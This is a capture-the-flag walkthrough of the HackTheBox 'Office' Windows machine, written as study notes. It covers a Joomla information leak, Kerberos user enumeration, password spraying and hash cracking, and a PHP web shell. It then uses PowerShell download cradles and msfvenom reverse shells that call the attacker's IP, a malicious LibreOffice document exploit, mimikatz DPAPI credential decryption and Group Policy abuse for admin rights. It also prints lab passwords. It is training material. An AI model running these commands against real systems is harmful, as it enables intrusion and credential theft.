@@ -1,0 +1,332 @@
+==========================================================================================
+				********	HTB Machines: Office walkthrough Windows (Hard)	*********
+==========================================================================================
+To get a proper sense of the machine, I will run an NMAP scan on the host via the command:
+
+** export IP=10.10.11.3
+** nmap -n -Pn --top-ports=2000 $IP --disable-arp-ping --reason
+
+Nmap scan report for 10.10.11.3
+PORT     STATE SERVICE          REASON
+
+53/tcp   open  domain           syn-ack
+80/tcp   open  http             syn-ack
+88/tcp   open  kerberos-sec     syn-ack
+139/tcp  open  netbios-ssn      syn-ack
+389/tcp  open  ldap             syn-ack
+443/tcp  open  https            syn-ack
+445/tcp  open  microsoft-ds     syn-ack
+464/tcp  open  kpasswd5         syn-ack
+593/tcp  open  http-rpc-epmap   syn-ack
+636/tcp  open  ldapssl          syn-ack
+3268/tcp open  globalcatLDAP    syn-ack
+3269/tcp open  globalcatLDAPssl syn-ack
+
+From the above NMAP scan output, we can say that the host might be a DC (port 53) since it has DNS 
+running on it but since its a windows host, we scan ay it is a DC.
+
+We have a web server running (p 80/433), we have kerberos (for auth), we have AD LDAP i.e. (p 139, 
+445)
+
+In conclusion, this host is running a webserver. It might be a DC and had LDAP/SMb running.
+
+===========================================================================================
+HOST ENUM:
+==========
+-- Host: Windows OS
+-- CMS: Joomla 4.2.7
+
+db_type: msqlite
+db: joomla_db
+dbprefix: if2tx_
+user: root,
+host: localhost,
+password: H0lOgrams4reTakIng0Ver754!
+
+name: Tony Stark
+username: Administrator
+email: administrator@holography.htb
+
+username: dwolfe
+password: H0lOgrams4reTakIng0Ver754!
+
+username: tstark
+password: playboy69
+
+===========================================================================================
+++ Exploitation walkthrough:
+============================
+Since we have a web server, lets try to see what we can get from it. From the NMAP version and simple 
+scripts scans, w esee a robots.tst file. In this file, the below paths were disallowed:
+
+** /administrator/, /api/, /bin/, /cache/, /cli/, /components/, /includes/, /installation/,
+/language/, /layouts/, /libraries/, /logs/, /modules/, /plugins/, /tmp/
+
+In the robots.txt file, we also see that its a joomla CMS web app. we can use joomscan to see what we 
+can get from the web server.
+
+by runnign the below command, I got to see some paths that could be viewed from the web browser. 
+searching for a vuln for th version of joomla used on google i got a github repo at:
+
+** https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT
+
+In the above repo, I saw rhe below API path to view password and I accessed it directly from the 
+browser and got the db creds for user root on the joomla site.
+
+** /api/index.php/v1/config/application?public=true
+** http://10.10.11.3/api/index.php/v1/config/application?public=true
+
+From the same github repo, I saw API path for username enum 
+
+** /api/index.php/v1/users?public=true
+** http://10.10.11.3/api/index.php/v1/users?public=true
+
+The above is helpful but since the mysql server is bound to localhost, we cannot access it from our 
+system.
+
+From the username API enum, we got the user name and email of the admin. We can try to brutforce the 
+password with hydra but there was no luck with bruteforcing and we got our IP blocked for a few 
+minutes.
+
+Since this is a DC, and we have a valid username and mtsql password, we can do an RPC-bruteforce 
+because its the best way to blindly enumerate usernames on a DC.
+
+We need to get some type of auth to the DC. Since the above didnt work, we will use try a kerbrute 
+technique.
+
+This will bruteforce via the kerberose pre-auth i.e via this technique, we can validate of a user 
+exists or not.
+
+The benefit if the RID bruteforce is that we can do it based on numnbers and we specify the UID of 
+1000 and so on and we get the useranme that corelate with that UID but with kerbrute we need to know 
+the username. The tool used can be foind here: https://github.com/ropnop/kerbrute
+
+** https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
+** ./kerbrute_linux_amd64 userenum --dc $IP -d office.htb /usernames/xato-net-10-million-usernames.txt
+
+Note: The domain param needed to be a FQDN else it will fail
+
+I created a username list and added the username found in the API endpoint. We can also use the 
+seclist wordlist of '/usernames/xato-net-10-million-usernames.txt'
+
+Either way, I got the Administrator username we found earlier as valid.
+
+Next I can do a password spary with the mysql password we got from the API endpioit.
+
+To create a list of usernames from the outpiut of the tool, 1st line, we use awk utility to get the
+usernames and add the to a file for passwor spraying using crackpamexec tool.
+
+** 2024/07/09 16:38:41 >  [+] VALID USERNAME:       Administrator@office.htb
+** cat kerbrute.out | grep VALID| awk '{print $7}' | awk F@ '{print $1}' > username.txt or
+** cat kerbrute_outfile.txt | cut -f 8 -d ' ' | awk -F@ '{print$1}'
+
+After password spraying we get a dwolfe success login but since we dont have a pwn from the output,
+we cannot use psexec i.e the user logged in is not an admin.
+
+** crackmapexec smb 10.10.11.3 -u username.txt -p H0lOgrams4reTakIng0Ver754! --continue-on-success
+** crackmapexec smb 10.10.11.3 -u dwolfe -p H0lOgrams4reTakIng0Ver754! --shares
+** crackmapexec smb 10.10.11.3 -u username.txt -p H0lOgrams4reTakIng0Ver754! --rid-brute
+
+The last command '--rid-brute' will show us more users in the domain.
+
+So now that we have valid user creds for dwolfe, we will login to the SMB server via smbclient
+
+** crackmapexec smb 10.10.11.3 -u dwolfe -p H0lOgrams4reTakIng0Ver754! --shares
+** smbclient \\\\10.10.11.3\\sysvol -U 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!'
+
+from the SMb server, we see that we have read access to the 'SOC Analysis' share. in this share we
+get a .pcap file. We can use pcredz to view a pcap file too.
+
+Looking at the file via wireshark, we see filter for the kerberos protocol and we see the pre-auth
+proces for user tstark.
+
+In the pre-auth process, cname or client name is the user and sname or server name is the server we
+are authenticating to.
+
+what we have is an handshake, if we look at the encryption type, we see that it is etype 18. As long
+as we have the enctpyted timestamp, we can manually create the hash.
+
+The cipher value under the padata-type attribute is the encrypted timestamp we want. Next we google
+hashcat example hashes, to see hoe to fomrat the hash.
+
+We use the site: hashcat.net/wiki/doku.php and search for krb or etype 18 and chose pre-auth.
+
+** $krb5pa$18$hashcat$HASHCATDOMAIN.COM$96c289009b05181bfd32062962740b1b1ce5f74eb1
+** $krb5pa$18$<user's name>$office.htb$<cipher_value>
+
+Once we create the above hash, we save it to a file and use hashcat to get the clear text password
+
+** hahscat above_hashfile.txt word_list.txt
+
+Now we get the password for the tstark user 'playboy69' and then login on the admin portal.
+
+The quickest way to get RCE on a CMS is via the templatevsice most CMs have it. We then edit a php
+file to run a reverse shell when loaded on the webpage.
+
+Make sure you can access the file (we are editing for a reverse shell) on the web browser.
+
+its good practice to use if isset($_REQUEST['CMD']) { system($_REQUEST['CMD']); }. This way if any
+other user access the same page without adding the '?cmd' url parameter, the pager does not error out
+
+Since we are dealing with a windows host, we will add the below command to the URL parameter:
+
+** cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 filename.ps1
+** cmd=powrshell IEX (New-Object net.webclient).downloadstring('http://<my_IP>:port/filename.ps1')
+** nc -lnvp port_number
+
+Remember when post-enum on a windows machine, we look for the 'seImpersonate' priv toescalate to
+system via the potatoe exploit.
+
+Going through the host, in the xampp/apache/conf/httpd.conf file we see a virtual host listening on 
+port 80803.
+
+We need to use chisel to create a tunnel to tunnel forward the traffic from the host to our browser
+via local host. First we send chiesel to the victim host
+
+** chisel server --reverse --port 8001
+** chisel.exe client kali_IP:port R:8003:127.0.0.1:8003
+** http://127.0.0.1:8003
+
+From the internal web app, we see office application, then we google 'powershell list installed 
+'software'. We want to know the vrsion of the office software isntalled.
+
+We can use winPEASx64 for this. But the shell was not giving us output s e decided to run as another
+user using the Runascs tool from github.
+
+** runascs.exe tstark playboy69 cmd.exe -r kali_IP:port
+
+The runas tool gives us a reverse shell and we then run the winpeasx64 tool as tstark.
+
+** winpeas.exe
+
+Winpeas did not give use waht we want, so we use the powershell command instaed.
+
+** get-wmiobject --class win32_project
+
+We see that its libreoffice 5.2.6.2 installed on the host. Googling for an exploit we see one on 
+github. There are numerous exploits available. CVE-2023-2255, CVE-2023-23752, CVE-2024-4577
+
+The intended exploit path was to take the registry edit permission we have and change the registry to 
+enable macros in open office.
+
+The document is HTMl, the actual CVE is just injecting a script object in the content portion of the 
+open office document and telling it its a macro. This works even if open office macros is disabled 
+because its not the standadr way of runnig amacro.
+
+** 7z x ../test.odt
+** vi content.xml
+** python3 CVE-2023-2255.py --cmd "powerhell -enc base64_encoded_reverse_shell" --output 'expl.odt'
+
+The on the internal web app we access via chisel, we upload the generated malicious payload and wait
+to get a reverse shell on out kali machine.
+
+Another way to go about it is to create a reverse shell with msfvenom, sendit to the victim host and
+tell the CVE to run the reverse hell on the victim as seen below:
+
+** msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali_IP LPORT=port -f exe -o shellah.exe
+** python3 -m http.server port_number
+** PS C:\programdata\> wget http://kali_IP:port/shellah.exe
+** python3 CVE-2023-2255.py --cmd "C:\programdata\shellah.exe" --output exploit2.odt
+** nc -lnvp port
+
+Looking at whoami /priv, we see that the tstark user has the custom privilege of editing the registry
+We say custom cos of the office part in the priv name.
+
+We can google "openoffice macro security level registry" (see amdx.help) to then view the currnet 
+security level for macros on the host, we query the registry by: 
+
+** reg query HKLM\SOFTWARE\POLICIES\libreoffice\org.openoffice......
+** reg.exe add include_above_path_gotten_form_website /V value /t REG_DWORD /d 0 /f
+
+Now we manually create a macro in an open office document with metasploit: 
+
+** sudo msfdb run
+** use exploit/multi/misc/openoffice_document_macro
+** set payload windows/x64/meterpeter_reverse_tcp
+** set LHOST tun0
+** set SRVHOST tun0
+** set SRVPORT port_numer
+
+Now we copy the generated malicious .odt file and upload it to the victim via the internal webapp.
+
+When in a domain-joined host, we should look for DPAPI keys using the below command. its good to 
+query the user to know if we are in an interactve session.
+
+** query user
+** vaultcmd /list
+** cd C:\users\ppotts\appdata\roaming\microsoft\credentials		to view dpapi blobs
+** powershell
+** gci -force							To view hidden file in a directory
+
+See http://ippsec.rocks and searc for dpapi. Watch the Access walkthrough video. Always download 
+these dpapi blobs cos they are like your windows built-in password mamanger. we can use the domain 
+keys if we are domain admin and get the master key to the domain, we can then decrypt the dpapi 
+blobs.
+
+Since they are SAAS software as a service, just like web sites with creds, we find more creds after 
+we get domain admin locally unlike external things like conflunce and jira.
+
+If we do type file_name from the above credential directory, what we see is an encrypted blob. We
+need to get the master key in the protect folder.
+
+There can be multiple blobs in the protect folder and we try to get the master from any of them.
+
+** cd ..\protect
+** dir
+** cd s*
+** gci -force
+
+Now, to get the master key or the secret, we need to know the user's pasword. But since we are 
+logged in, the users cred is cached alreay.
+
+We can query the DC which then will use windows NTLM auth to ask the DC to retrieve our blob for us 
+and its cached becasue we are logged in already. 
+
+Next we upload mimikats to the victim's host and list the dpapi blobs.
+
+** wget http://kail_IP:port/mimikatz.exe -o mimikatz.exe
+** ./mimikatz
+** dpapi::masterkey /in:C:\USers\username\appdata\roaming\microsoft\protect\blob_dir\blob_name /rpc
+
+We will run the above command for the three files to see if we can get the master key. We added /rpc 
+to tell mimikatsz to get our password via rcp.
+
+Now that we have the master keys, we then go back to the redentials directory to see if we can grab 
+the blobs.
+
+** dpapi::cred /in:C:\users\username\appdata\roaming\microsoft\credentials\blob /unprotect /masterkey:paste_masterkey_for_blod_in_protected_folder
+
+We will try each of the master key gotten from previous operation until we get the file/blob 
+decrypted. So prtected holds the masterkey, and credentials holds the users passwords.
+
+when we try to decrypt the second blob in the credentials folder, we get office\hhogan, H4ppyFtW183#
+
+with the hhogan creds,we can use evilwin-rm to connectot the victim host as the hogan user since its
+part of the remote managemt group, but we can also use the runascs.exe tool too.
+
+** .\runascs.exe hhogan H4ppyFtW183# powershell -r kali_IP:port
+** evil-winrm -i kali_IP -u hhogan -p 'H4ppyFtW183#'
+
+This user is a member of the GPO (Group policy managers) managrs from whomai /priv. This means we can 
+edit the GPOs. We can then create a policy that will add us to local admin via sharpcGPOabuse tool. 
+
+We can also use the tool to create a scheduled task that will give use code execution. When we have
+Group policy ability, it good to add to local admin cos its an older feature in widoews so it more
+stable than scheduling tasks.
+
+Just google sharcollection. Its a bunch of precomplied .NET binaries. we cna use the framwork_any i.e
+
+** cp /opt/SharpCollection/NetFramwor_4.7_Any/sharp/sharpaGPObuse.exe .
+** wget http://kali_IP:port/sharpGPOabuse.exe -o sharpabuse.exe
+** .\sharpGPOAbuse.exe --AddLocalAdmin --useraccount HHogan --GPOName "Default Domain policy"
+** gpupdate /force
+
+We can use either evil-winrm or runascs.exe and run the above command. runascs.exe didnt execute the
+above command.
+
+After running the above command we will have to relogin again and when we do whoami /groups we see
+that the hhogan user is now part of the local admin or builtin\administrators group.
+
+Let's look at the bookworm walkthrough after redoing this on our own.
+
+
